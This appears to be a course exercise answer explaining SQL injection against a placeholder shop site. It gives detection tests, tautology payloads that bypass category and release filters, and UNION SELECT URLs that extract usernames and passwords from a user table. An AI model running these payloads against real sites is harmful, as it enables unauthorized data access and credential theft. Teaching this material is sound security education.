### **Exercice 01: SQL Injection Attacks**

#### **1. How to verify if the site is vulnerable to SQL injection?**

To check for SQL injection vulnerability, manipulate the `category` parameter in the URL to inject SQL code and observe the application's response. For example:

- Original URL: `https://insecure-website.com/products?category=Gifts`
- Test URL: `https://insecure-website.com/products?category=Gifts' OR '1'='1`

This modifies the SQL query to:

```sql
SELECT id, nom, category, price 
FROM products 
WHERE category = 'Gifts' OR '1'='1' AND released = 1
```

Since `'1'='1'` is always true, the query returns all products where `released = 1`, regardless of the category. If the application displays all products (not just those in the "Gifts" category), it indicates a vulnerability, as the input directly affects the query without proper sanitization.

Another test is to inject an invalid query, e.g., `category=Gifts'` (adding a single quote). If the application returns a database error (e.g., SQL syntax error), it confirms that user input is not properly sanitized or escaped.

#### **2. Construct an attack to display all products from any category, including unknown categories.**

To bypass the category filter and display all products (including those in unknown categories or unreleased products), use a tautology to make the `WHERE` condition always true. Modify the URL as follows:

- Attack URL: `https://insecure-website.com/products?category=Gifts' OR '1'='1`

This results in the SQL query:

```sql
SELECT id, nom, category, price 
FROM products 
WHERE category = 'Gifts' OR '1'='1' AND released = 1
```

Alternatively, to include unreleased products (`released = 0`), use:

- Attack URL: `https://insecure-website.com/products?category=Gifts' OR 1=1 --`

This produces:

```sql
SELECT id, nom, category, price 
FROM products 
WHERE category = 'Gifts' OR 1=1 --' AND released = 1
```

The `--` comments out the rest of the query, making it equivalent to:

```sql
SELECT id, nom, category, price 
FROM products 
WHERE category = 'Gifts' OR 1=1
```

This returns all products from all categories, ignoring the `released = 1` condition.

#### **3. The results of the SQL query are returned and displayed in the application’s responses.**

This statement implies that the application directly outputs the results of the SQL query (e.g., product details) to the user interface. For an attacker, this means that any manipulated query (like those in questions 2 and 4) will have its results visible in the application’s response, such as a webpage listing products or other data. This behavior confirms the vulnerability, as the application does not filter or hide sensitive data returned by the database.

#### **4. Construct an attack to retrieve data from other tables, specifically the `user` table (id, name, utilisateur, password, type_account, date).**

To extract data from the `user` table, use a `UNION` attack to append the desired data to the original query’s result set. The original query is:

```sql
SELECT id, nom, category, price 
FROM products 
WHERE category = 'Gifts' AND released = 1
```

The `user` table has columns `id, name, utilisateur, password, type_account, date` (6 columns), but the original query returns 4 columns (`id, nom, category, price`). To match the column count, select 4 columns from the `user` table or pad with dummy values. Construct the attack as follows:

- Attack URL: `https://insecure-website.com/products?category=Gifts' UNION SELECT id, name, utilisateur, password FROM user --`

This results in:

```sql
SELECT id, nom, category, price 
FROM products 
WHERE category = 'Gifts' UNION SELECT id, name, utilisateur, password FROM user --' AND released = 1
```

- The `UNION` combines the results of the two queries.
- The `--` comments out the `AND released = 1` condition.
- The query returns:
  - All products where `category = 'Gifts' AND released = 1`.
  - All rows from the `user` table, with columns `id, name, utilisateur, password` mapped to `id, nom, category, price` in the output.

If the application displays the results, the attacker sees user data (e.g., IDs, names, usernames, and passwords) in the product listing.

To retrieve all columns (`id, name, utilisateur, password, type_account, date`), the attacker must adjust the query to handle the column mismatch, possibly by injecting into a different endpoint or using a tool to enumerate columns. Alternatively, use:

- Attack URL: `https://insecure-website.com/products?category=Gifts' UNION SELECT id, name, utilisateur, concat(password, ' ', type_account, ' ', date) FROM user --`

This concatenates `password`, `type_account`, and `date` into one column to fit the 4-column output.
